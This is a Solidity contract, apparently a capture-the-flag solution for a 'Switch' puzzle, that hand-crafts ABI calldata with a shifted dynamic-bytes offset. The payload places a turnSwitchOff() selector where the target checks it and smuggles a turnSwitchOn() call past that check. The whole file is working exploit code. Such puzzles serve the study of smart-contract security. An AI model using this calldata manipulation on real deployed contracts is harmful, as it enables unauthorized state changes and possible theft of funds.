// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 0xcdb8e591E4Ad74Ccaa3fd3e28FA726Ad191C9272

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
}

contract GoSmashThem {
    event Log(bool success, bytes data);

    function poke(address _target) public {
        bytes4 selector = bytes4(keccak256("flipSwitch(bytes)")); //0x30c8d1da
        bytes memory toOff = abi.encodePacked(
            bytes4(keccak256("turnSwitchOff()"))
        ); //0x20606e15
        bytes memory toOn = abi.encodePacked(
            bytes4(keccak256("turnSwitchOn()"))
        ); //0x76227e12

        bytes memory dataToSendAsCalldata = abi.encodePacked(
            selector,
            bytes32(
                0x0000000000000000000000000000000000000000000000000000000000000060
            ),
            bytes32(
                0x0000000000000000000000000000000000000000000000000000000000000004
            ),
            toOff,
            bytes28(0x0),
            bytes32(
                0x0000000000000000000000000000000000000000000000000000000000000004
            ),
            toOn
        );

        (bool success, bytes memory received) = _target.call(
            dataToSendAsCalldata
        );
        emit Log(success, received);
    }
}
